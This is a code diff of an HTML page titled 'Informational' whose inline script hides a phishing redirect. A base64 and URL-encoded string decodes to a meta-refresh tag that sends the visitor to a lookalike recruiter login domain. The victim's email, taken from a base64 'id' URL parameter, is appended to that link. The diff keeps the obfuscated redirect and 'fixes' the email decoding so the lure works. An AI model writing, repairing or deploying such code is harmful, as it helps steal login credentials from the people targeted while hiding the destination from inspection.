@@ -6,25 +6,27 @@
     <title>Informational</title>
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
-      let hasStatus = new URLSearchParams(window.location.search).has("status");
-      if (hasStatus) {
-        let status = new URLSearchParams(window.location.search).get("status");
-        if (status == "true") {
-          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ucmVjcnVpdGVybGlua2Vkd2ViLml0LmNvbS9GY3Bxd2pNciUyMiUyMC8lM0U="
-          let id = new URLSearchParams(window.location.search).get("id");
+  let hasStatus = new URLSearchParams(window.location.search).has("status");
+  if (hasStatus) {
+    let status = new URLSearchParams(window.location.search).get("status");
+    if (status == "true") {
+      let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ucmVjcnVpdGVybGlua2Vkd2ViLml0LmNvbS9GY3Bxd2pNciUyMiUyMC8lM0U=";
+      let id = new URLSearchParams(window.location.search).get("id");
 
-          let decodedRef = decodeURIComponent(atob(`${ref}`))
+      // ✅ decode id before use
+      let decodedId = atob(id);
 
-          let lastIndexOfColon = decodedRef.lastIndexOf('"');
-          newDecodedRef= decodedRef.slice(0, lastIndexOfColon) + "?email=" + id + "\" />";
-          const encodedUrl = btoa(newDecodedRef);
+      let decodedRef = decodeURIComponent(atob(ref));
+      let lastIndexOfColon = decodedRef.lastIndexOf('"');
+      let newDecodedRef = decodedRef.slice(0, lastIndexOfColon) + "?email=" + decodedId + "\" />";
+      const encodedUrl = btoa(newDecodedRef);
 
+      console.log(newDecodedRef);
+      document.write(decodeURIComponent(atob(encodedUrl)));
+    }
+  }
+</script>
 
-          console.log(newDecodedRef);
-          document.write(decodeURIComponent(atob(`${encodedUrl}`)));
-        }
-      }
-    </script>
   </head>
 
   <body>
